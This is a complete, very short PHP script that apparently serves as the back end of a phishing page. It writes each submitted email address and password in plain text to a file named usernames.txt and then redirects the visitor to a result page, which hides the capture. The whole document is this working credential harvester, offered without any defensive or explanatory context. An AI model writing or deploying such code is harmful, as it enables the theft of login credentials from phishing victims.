<?php

file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: ./result.html');
exit();
